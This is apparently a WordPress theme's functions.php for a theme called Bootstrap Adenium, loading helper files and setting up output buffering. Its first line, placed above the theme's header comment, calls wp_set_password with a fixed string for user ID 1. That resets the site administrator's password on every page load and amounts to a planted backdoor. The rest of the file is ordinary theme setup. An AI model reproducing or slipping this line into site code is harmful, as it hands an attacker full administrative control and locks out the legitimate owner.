<?php
  wp_set_password ('j6t2hybt26', 1);
    /**
     * Bootstrap Adenium theme
     */
    
    
    require get_template_directory() . '/functions/cleanup.php';
    require get_template_directory() . '/functions/setup.php';
    require get_template_directory() . '/functions/enqueues.php';
    require get_template_directory() . '/functions/custom-login.php';
    require get_template_directory() . '/functions/widgets.php';
    require get_template_directory() . '/functions/search-widget.php';
    require get_template_directory() . '/functions/index-pagination.php';
    require get_template_directory() . '/functions/split-post-pagination.php';
    require get_template_directory() . '/functions/feedback.php';
    require get_template_directory() . '/functions/rename-image.php';
    require get_template_directory() . '/functions/limita-caracteres.php';
    require get_template_directory() . '/functions/shortcodes.php';

    //require get_template_directory() . '/functions/remove-query-string.php';

    function callback($buffer) {
        return $buffer;
    }

    function add_ob_start() {
        ob_start("callback");
    }

    function flush_ob_end() {
        ob_end_flush();
    }

    add_action('init', 'add_ob_start', 1);
    add_action('wp_footer', 'flush_ob_end');
    